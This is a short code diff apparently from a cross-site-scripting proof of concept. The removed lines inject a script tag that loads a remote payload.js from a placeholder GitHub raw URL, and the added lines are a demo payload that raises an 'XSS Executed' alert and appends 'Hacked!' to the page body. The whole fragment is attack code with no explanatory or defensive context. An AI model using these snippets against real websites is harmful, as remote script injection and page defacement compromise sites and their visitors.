@@ -1,5 +1,2 @@
-document.body.appendChild(
-  Object.assign(document.createElement("script"), {
-    src: "https://raw.githubusercontent.com/yourusername/yourrepo/main/payload.js"
-  })
-);
+alert("XSS Executed from GitHub!");
+document.body.innerHTML += "<h1>Hacked!</h1>";
